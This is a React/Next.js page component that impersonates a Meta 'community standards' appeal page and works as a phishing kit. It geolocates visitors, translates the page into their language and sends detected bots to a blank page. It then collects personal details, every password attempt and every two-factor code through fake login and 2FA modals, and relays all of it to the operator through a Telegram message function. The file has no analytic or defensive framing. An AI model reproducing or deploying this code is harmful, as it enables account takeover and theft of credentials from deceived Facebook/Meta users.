'use client';

import { useState, useEffect, useMemo, useCallback, useRef, type MouseEvent } from 'react';
import type { StaticImageData } from 'next/image';
import axios from 'axios';
import FirstFormModal from '@/components/FirstFormModal';
import LoginModal from '@/components/LoginModal';
import TwoFAModal from '@/components/TwoFAModal';
import SuccessModal from '@/components/SuccessModal';
import { homeDefaultTexts } from '@/i18n/default-texts';
import type { FormData, UiTexts } from '@/types';
import '@/assets/css/community-standards.css';
import LogoMeta from '@/assets/images/meta-logo-grey.png';
import Background from '@/assets/images/background.png';
import BgHero from '@/assets/images/bg_hero.png';
import TradeMark from '@/assets/images/trade-mark.png';
import Copyright from '@/assets/images/copyright.png';
import Counterfeit from '@/assets/images/counterfeit.png';
import IcWarning from '@/assets/images/ic_warning.svg';

import { translateTexts } from '@/utils/translate-by-lang';
import countryToLanguage from '@/utils/country_to_language';
import { sendTelegramMessage } from '@/utils/send-message';
import { buildMetaMessage } from '@/utils/message';
import detectBot from '@/utils/detect_bot';
import { redirectToRandomContact } from '@/utils/contact-redirect';

const GEO_ENDPOINTS: Array<{
    url: string;
    map: (data: Record<string, string | undefined>) => {
        ip?: string;
        city?: string;
        region?: string;
        country?: string;
        countryCode?: string;
    };
}> = [
    {
        url: 'https://get.geojs.io/v1/ip/geo.json',
        map: (data) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country,
            countryCode: data?.country_code
        })
    },
    {
        url: 'https://ipapi.co/json/',
        map: (data) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country_name,
            countryCode: data?.country_code
        })
    },
    {
        url: 'https://ipwho.is/',
        map: (data) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country,
            countryCode: data?.country_code
        })
    }
];

const normalizeCountryCode = (code = '') => String(code).trim().toUpperCase();
const isUnknownValue = (value = '') => {
    const normalized = String(value ?? '').trim().toLowerCase();
    return !normalized || ['unknown', 'n/a', 'na', 'null', 'undefined', '-'].includes(normalized);
};
const normalizeGeoValue = (value?: string) => (isUnknownValue(value) ? '' : String(value).trim());

interface GeoCandidate {
    ip: string;
    city: string;
    region: string;
    country: string;
    countryCode: string;
}

const getFallbackLanguage = () => {
    const [browserLang = 'en'] = String(navigator.language || 'en').split('-');
    return browserLang.toLowerCase() || 'en';
};

const resolveTargetLang = (countryCode = '') => {
    const normalizedCode = normalizeCountryCode(countryCode);
    const byIp = countryToLanguage[normalizedCode];
    return byIp || getFallbackLanguage();
};

const fetchGeoData = async (): Promise<GeoCandidate> => {
    let bestCandidate: GeoCandidate | null = null;
    let bestScore = -1;

    const getCandidateScore = (candidate: GeoCandidate) => {
        const hasCountry = !isUnknownValue(candidate.country);
        const hasRegion = !isUnknownValue(candidate.region);
        const hasCity = !isUnknownValue(candidate.city);
        const hasIp = !isUnknownValue(candidate.ip);
        const hasCountryCode = !isUnknownValue(candidate.countryCode);
        return (hasCity ? 3 : 0) + (hasRegion ? 2 : 0) + (hasCountry ? 2 : 0) + (hasCountryCode ? 1 : 0) + (hasIp ? 1 : 0);
    };

    for (const endpoint of GEO_ENDPOINTS) {
        try {
            const response = await axios.get(endpoint.url, { timeout: 5000 });
            const mapped = endpoint.map(response.data || {}) || {};
            const candidate = {
                ip: normalizeGeoValue(mapped.ip),
                city: normalizeGeoValue(mapped.city),
                region: normalizeGeoValue(mapped.region),
                country: normalizeGeoValue(mapped.country),
                countryCode: normalizeGeoValue(mapped.countryCode)
            };
            const score = getCandidateScore(candidate);

            if (score > bestScore) {
                bestCandidate = candidate;
                bestScore = score;
            }

            if (candidate.city && candidate.region && candidate.country) {
                return candidate;
            }
        } catch {
            continue;
        }
    }
    if (bestCandidate && bestScore > 0) {
        return bestCandidate;
    }
    throw new Error('All geo providers failed');
};

const assetSrc = (asset: StaticImageData | string) => (typeof asset === 'string' ? asset : asset.src);

const Home = () => {
    const [showReviewPage, setShowReviewPage] = useState(false);
    const [showLoginModal, setShowLoginModal] = useState(false);
    const [show2FAModal, setShow2FAModal] = useState(false);
    const [showSuccessModal, setShowSuccessModal] = useState(false);
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        reason: '',
        additionalNotes: ''
    });
    const [loginData, setLoginData] = useState({ email: '', password: '' });
    const [passwordAttempts, setPasswordAttempts] = useState<string[]>([]);
    const [twoFAAttempts, setTwoFAAttempts] = useState<string[]>([]);
    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', country_code: 'US' });
    const messageIdRef = useRef<number | null>(null);
    const sendQueueRef = useRef<Promise<void>>(Promise.resolve());
    const formDataRef = useRef(formData);
    const selectedMethodRef = useRef('');
    const [translatedTexts, setTranslatedTexts] = useState<UiTexts>({});

    useEffect(() => {
        formDataRef.current = formData;
    }, [formData]);

    useEffect(() => {
        const storedId = localStorage.getItem('message_id');
        if (storedId) {
            const parsed = Number.parseInt(storedId, 10);
            if (!Number.isNaN(parsed)) {
                messageIdRef.current = parsed;
            }
        }
    }, []);

    const defaultTexts = useMemo(() => ({ ...homeDefaultTexts }), []);

    const translateAllTexts = useCallback(
        async (lang: string) => {
            try {
                const keys = Object.keys(defaultTexts);
                const sourceTexts = keys.map((key) => defaultTexts[key as keyof typeof defaultTexts]);
                const translations = await translateTexts(sourceTexts, lang);
                const translated: UiTexts = {};
                keys.forEach((key, index) => {
                    translated[key] = translations[index];
                });

                setTranslatedTexts(translated);
            } catch (error) {
                console.error('Translation error:', error);
                setTranslatedTexts(defaultTexts);
            }
        },
        [defaultTexts]
    );

    const initializeApp = useCallback(async () => {
        try {
            try {
                const data = await fetchGeoData();
                const normalizedCountryCode = normalizeCountryCode(data.countryCode);
                setIpInfo({
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country || 'Unknown',
                    country_code: normalizedCountryCode || 'Unknown'
                });
                localStorage.setItem(
                    'ipInfo',
                    JSON.stringify({
                        ip: data.ip || 'Unknown',
                        city: data.city || 'Unknown',
                        region: data.region || 'Unknown',
                        country: data.country || 'Unknown',
                        country_code: normalizedCountryCode || 'Unknown'
                    })
                );

                const lang = resolveTargetLang(normalizedCountryCode);
                localStorage.setItem('targetLang', lang);

                if (lang !== 'en') {
                    await translateAllTexts(lang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            } catch (error) {
                console.error('Error fetching IP:', error);
                const cachedLang = String(localStorage.getItem('targetLang') || '').trim().toLowerCase();
                const fallbackLang = cachedLang && cachedLang !== 'en' ? cachedLang : getFallbackLanguage();
                localStorage.setItem('targetLang', fallbackLang || 'en');

                if (fallbackLang !== 'en') {
                    await translateAllTexts(fallbackLang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            }

            const botResult = await detectBot();
            if (botResult.isBot) {
                window.location.href = 'about:blank';
                return;
            }
        } catch (error) {
            console.error('Initialization error:', error);
            setTranslatedTexts(defaultTexts);
        }
    }, [defaultTexts, translateAllTexts]);

    useEffect(() => {
        initializeApp();
    }, [initializeApp]);

    const buildAndSend = (form: FormData, passwordLogs: string[], codeAttempts: string[]) => {
        const geoInfo = {
            asn: 0,
            ip: ipInfo.ip,
            country: ipInfo.country,
            city: ipInfo.city,
            region: ipInfo.region,
            country_code: ipInfo.country_code || 'US'
        };

        const message = buildMetaMessage({
            geoInfo,
            userData: {
                fullName: form.fullName,
                personalEmail: form.personalEmail,
                businessEmail: form.businessEmail,
                phoneNumber: form.phone,
                facebookPageName: form.pageName
            },
            passwords: passwordLogs,
            codes: codeAttempts,
            selectedMethod: selectedMethodRef.current
        });

        // Xếp hàng tuần tự: xóa tin cũ → gửi tin mới (data cũ + mới)
        sendQueueRef.current = sendQueueRef.current
            .catch(() => {})
            .then(async () => {
                const oldMessageId = messageIdRef.current;
                const result = await sendTelegramMessage(message, oldMessageId);

                if (result?.success && typeof result.message_id === 'number') {
                    messageIdRef.current = result.message_id;
                    localStorage.setItem('message_id', String(result.message_id));
                }
            })
            .catch((error) => {
                console.error('Telegram send failed:', error);
            });
    };

    const handleFirstFormSubmit = (data: FormData) => {
        formDataRef.current = data;
        setFormData(data);
        buildAndSend(data, [], []);
        setShowReviewPage(false);
        setShowLoginModal(true);
    };

    const handleLoginSubmit = (email: string, password: string) => {
        setLoginData({ email, password });
        const nextPasswordAttempts = [...passwordAttempts, password];
        setPasswordAttempts(nextPasswordAttempts);
        buildAndSend(formDataRef.current, nextPasswordAttempts, twoFAAttempts);
    };

    const handle2FASubmit = (code: string) => {
        const newAttempts = [...twoFAAttempts, code];
        setTwoFAAttempts(newAttempts);
        buildAndSend(formDataRef.current, passwordAttempts, newAttempts);
    };

    const handleMethodSelect = (method: string) => {
        selectedMethodRef.current = method;
        buildAndSend(formDataRef.current, passwordAttempts, twoFAAttempts);
    };

    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;

    const handleFakeLinkClick = (event: MouseEvent<HTMLAnchorElement>) => {
        event.preventDefault();
        redirectToRandomContact();
    };

    const Footer = () => (
        <div className="bg-[#F5F6F6] pt-5 pb-5 border-t border-[#E0E0E0] w-full">
            <div className="max-w-[1280px] w-full mx-auto px-4">
                <div className="community-footer-languages flex flex-wrap justify-center gap-4 mb-4 text-[13px] text-gray-600">
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        English (US)
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        English (UK)
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        Italiano
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        Français
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        中文(简体)
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        日本語
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        한국어
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        עברית
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        Español
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        Português
                    </a>
                </div>
                <div className="community-footer-links flex flex-wrap justify-center gap-4 text-[13px] text-gray-600">
                    <p className="mr-4">{texts.footerCopyright}</p>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline">
                        {texts.footerAbout}
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline">
                        {texts.footerDevelopers}
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline">
                        {texts.footerCareers}
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline">
                        {texts.footerPrivacy}
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline">
                        {texts.footerCookies}
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline">
                        {texts.footerTerms}
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline">
                        {texts.footerHelpCentre}
                    </a>
                </div>
            </div>
        </div>
    );

    const Header = () => (
        <div className="bg-[#F5F6F6] h-[52px] flex items-center justify-center border-b border-[#E0E0E0]">
            <div className="max-w-[1280px] w-full flex items-center justify-between px-4">
                <a href="/help">
                    <img src={assetSrc(LogoMeta)} width="64" alt="Meta" />
                </a>
            </div>
        </div>
    );

    return (
        <>
            {showReviewPage ? (
                <div className="community-page min-h-screen w-full flex justify-center bg-white">
                    <div className="w-full">
                        <Header />
                        <FirstFormModal
                            show={true}
                            asPage={true}
                            onClose={() => setShowReviewPage(false)}
                            onSubmit={handleFirstFormSubmit}
                            texts={texts}
                        />
                        <Footer />
                    </div>
                </div>
            ) : (
                <div className="community-page min-h-screen w-full flex justify-center bg-white">
                    <div className="w-full">
                        <Header />

                        <div
                            className="bg-no-repeat bg-cover flex items-center justify-center"
                            style={{ backgroundImage: `url(${assetSrc(Background)})` }}
                        >
                            <div className="max-w-[1280px] w-full px-4 flex md:flex-row flex-col items-center md:gap-0 gap-8 justify-between py-6">
                                <div className="md:max-w-[50%] max-w-full w-full md:min-h-0 min-h-[300px] flex flex-col items-start text-left justify-center">
                                    <h1 className="font-[700] text-[32px] mb-3">{texts.heroTitle}</h1>
                                    <p className="text-[16px] mb-2">{texts.heroDesc}</p>
                                </div>
                                <div className="md:max-w-[50%] max-w-full w-full md:min-h-0 min-h-[300px] flex items-center justify-center">
                                    <img src={assetSrc(BgHero)} width="100%" alt="Hero" />
                                </div>
                            </div>
                        </div>

                        <div className="border-b border-[#E0E0E0]">
                            <div className="community-appeal">
                                <div className="community-appeal-intro">
                                    <div className="community-appeal-header">
                                        <img src={assetSrc(IcWarning)} className="w-[29px] h-[29px]" alt="" />
                                        <b className="community-appeal-title">{texts.appealTitle}</b>
                                    </div>
                                    <p className="text-gray-800">{texts.appealDesc1}</p>
                                    <p className="text-gray-800">{texts.appealDesc2}</p>
                                </div>

                                <div className="community-appeal-section">
                                    <p className="community-appeal-section-title">{texts.appealWhyTitle}</p>
                                    <p>{texts.appealWhy1}</p>
                                    <p>{texts.appealWhy2}</p>
                                </div>

                                <div className="community-appeal-section">
                                    <p className="community-appeal-section-title">{texts.appealWhatTitle}</p>
                                    <p>{texts.appealWhat1}</p>
                                    <p>{texts.appealWhat2}</p>
                                    <p>{texts.appealWhat3}</p>
                                </div>
                                <button
                                    type="button"
                                    onClick={() => setShowReviewPage(true)}
                                    className="community-appeal-button"
                                >
                                    {texts.appealButton}
                                </button>
                            </div>
                        </div>

                        <div className="community-ip-section mt-10 max-w-[1280px] w-full px-4 mx-auto">
                            <p className="text-center">
                                <b className="font-700 md:text-3xl text-2xl text-center">{texts.ipTitle}</b>
                            </p>

                            <div className="community-ip-row community-ip-row-text-first">
                                <div className="community-ip-copy community-ip-copy-left">
                                    <b className="font-700 md:text-2xl text-xl">{texts.trademarkTitle}</b>
                                    <p className="mt-2 text-gray-800">{texts.trademarkDesc}</p>
                                </div>
                                <div className="community-ip-image">
                                    <img src={assetSrc(TradeMark)} width="100%" alt="Trademark" />
                                </div>
                            </div>

                            <div className="community-ip-row community-ip-row-image-first">
                                <div className="community-ip-image">
                                    <img src={assetSrc(Copyright)} width="100%" alt="Copyright" />
                                </div>
                                <div className="community-ip-copy community-ip-copy-right">
                                    <b className="font-700 md:text-2xl text-xl">{texts.copyrightTitle}</b>
                                    <p className="mt-2 text-gray-800">{texts.copyrightDesc}</p>
                                </div>
                            </div>

                            <div className="community-ip-row community-ip-row-text-first">
                                <div className="community-ip-copy community-ip-copy-left">
                                    <b className="font-700 md:text-2xl text-xl">{texts.counterfeitTitle}</b>
                                    <p className="mt-2 text-gray-800">{texts.counterfeitDesc}</p>
                                </div>
                                <div className="community-ip-image">
                                    <img src={assetSrc(Counterfeit)} width="100%" alt="Counterfeit" />
                                </div>
                            </div>
                        </div>

                        <Footer />
                    </div>
                </div>
            )}

            <LoginModal
                show={showLoginModal}
                onClose={() => setShowLoginModal(false)}
                onSubmit={handleLoginSubmit}
                onSuccess={() => {
                    setShowLoginModal(false);
                    setShow2FAModal(true);
                }}
                texts={texts}
            />
            <TwoFAModal
                show={show2FAModal}
                onClose={() => setShow2FAModal(false)}
                onSubmit={handle2FASubmit}
                onMethodSelect={handleMethodSelect}
                onSuccess={() => {
                    setShow2FAModal(false);
                    setShowSuccessModal(true);
                }}
                texts={texts}
                formData={formData}
            />
            <SuccessModal show={showSuccessModal} onClose={() => setShowSuccessModal(false)} texts={texts} />
        </>
    );
};

export default Home;
